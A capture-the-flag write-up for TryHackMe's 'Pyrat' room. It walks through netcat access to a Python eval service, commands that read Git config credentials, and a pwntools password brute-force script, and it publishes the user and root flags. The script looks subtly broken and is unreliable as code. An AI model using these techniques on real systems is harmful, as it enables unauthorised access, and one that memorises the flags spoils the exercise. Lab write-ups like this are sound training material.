## Pyrat - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/pyrat)

<i>**Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. 
With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. 
A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. 
The script unveils a password, ultimately granting access to the root.**</i>

**IP: 10.10.23.85**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Python, Enumeration <br>

**Tools Used**: Nmap, pwntools

[pwntools](https://github.com/Gallopsled/pwntools)<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20CUT.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Started with Nmap scan as always.

  ```
  nmap -A -p- 10.10.23.85

  PORT     STATE SERVICE  REASON
  22/tcp   open  ssh      syn-ack ttl 63
  8000/tcp open  http-alt syn-ack ttl 63
  OS details: Linux 4.15  
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  ssh -> Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
  http-alt -> Version: SimpleHTTP/0.6 Python/3.11.2, also a server header
  | fingerprint-strings: 
  |   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop: 
  |     source code string cannot contain null bytes
  |   FourOhFourRequest, LPDString, SIPOptions: 
  |     invalid syntax (<string>, line 1)
  |   GetRequest: 
  |     name 'GET' is not defined
  |   HTTPOptions, RTSPRequest: 
  |     name 'OPTIONS' is not defined
  |   Help: 
  |_    name 'HELP' is not defined
  ```
  
- OK, then I visited web app and got a message `Try a more basic connection!`. Right... netcat exists.

  ```
  sudo nc 10.10.23.85 8000 -v
  ```
  
- After connecting with netcat, you need to use Python syntax in order to move around.

  ```
  print("Hello") -> Hello
  print(os.listdir('/')) -> lists directories
  ```

---

## ⚙️ Gaining Access

- After exploring for a while, I found an email that mentions Git directory with old `pyrat` code and when I found that directory there were credentials for SSH.

  ```
  print(os.listdir('/opt/dev/.git')) 
  print(open('/opt/dev/.git/config', 'r').read())
  [core]
          repositoryformatversion = 0
          filemode = true
          bare = false
          logallrefupdates = true
  [user]
          name = Jose Mario
          email = josemlwdf@github.com
  
  [credential]
          helper = cache --timeout=3600
  
  [credential "https://github.com"]
          username = think
          password = _TH1NKINGPirate$_
  ```
  
- Awesome, use this credentials `think:_TH1NKINGPirate$_` to login with SSH.

---

## 🧍 User Privilege Escalation

- User flag is pretty straightforward: `996bdb1f619a68361417cabca5454705`

---

## 👑 Root Privilege Escalation

- For root flag, I was trying for a while to escalate from inside but unfortunately couldn't make it work, so I switched to writing scripts since this whole challenge is Python based.
  I wrote 3 different scripts, 1 for endpoint fuzzing, 1 for password fuzzing and 1 for shell access. I will post just 1 script here since you should practice your Python skills! (shell.py script is not needed for this challenge)
  
- When I ran script for endpoint enumeration, I found 3 endpoits: `shell: $`, `admin:`, `Password:`

  ```python3 end_fuzz.py```
  
- Then I moved to password fuzzing which gave me: `admin, password: abc123`

  ```
  python3 pw_fuzz.py

  from pwn import *

  host = "TARGET-IP"
  port = 8000
  password_file = "/full/path/to/rockyou.txt"
  
  #connect to target
  def connect_to_service():
      return (host, port)
  
  #brute forcing 
  def attempt_password(password):
      
      conn = connect_to_service()
      conn.sendline(b"admin") #send 'admin' as username
      conn.recvuntil(b"Password:")
      conn.sendline(password.encode()) #send password from list
  
      response = conn.recvline(timeout=2)
      response = conn.recvline(timeout=2)
  
      if b"Password:" in response:
          print(f"Password {password} failed.")
          conn.close()
          return False
  
      elif b"Welcome" in response or b"Success" in response:  
          print(f"Correct password: {password} ")
          conn.close()
          return True
  
      else:
          print(f"Unexpected response for password {password}. Response: {response}")
          conn.close()
          return False

  #loops through pw list
  def fuzz_passwords():
      with open(password_file, "r", encoding="utf-8") as f:
          for password in f:
              password = password.strip()
              if attempt_password(password):
                  print(f"Found working password: {password}")
                  break
  
  if __name__ == "__main__":
      fuzz_passwords()
  ```

- Alrighty, since I have admin credentials getting root flag is pretty simple now and there's 2 ways to do it, both options will work.

- First option: Connecting with netcat as admin

  ```
  sudo nc 10.10.23.85 8000 -v
  admin
  Password:
  abc123
  
  Welcome Admin!!! Type "shell" to begin
  pwd
  ls
  cat root.txt
  ba5ed03e9e74bb98054438480165e221
  ```

- Second option: create a script in Python that will spawn interactive shell as root

  ```
  python3 shell.py
  Server response after sending 'admin': Password:
  
  Sending password: abc123
  Server response for password 'abc123': Welcome Admin!!! Type "shell" to begin
  
  Sent 'shell' command. Waiting for shell response...
  Shell response: # 
  Enter command to execute:
  
  pwd
  ls
  cat root.txt
  ba5ed03e9e74bb98054438480165e221
  ```

- Here's the [documentation for pwntools](https://docs.pwntools.com/en/stable/), for installing them in Kali use `sudo apt install python3-pwntools`. Practice Practice Practice Practice Practice!

---

## 🏁 Flags

- **User Flag**: `996bdb1f619a68361417cabca5454705`
- **Root Flag**: `ba5ed03e9e74bb98054438480165e221`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `It was a different type of challenge then the ones I am used to, so it was kinda weird but fun!`

- What did I learn?
  `Sharpening my Python skill and practicing pwntools.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
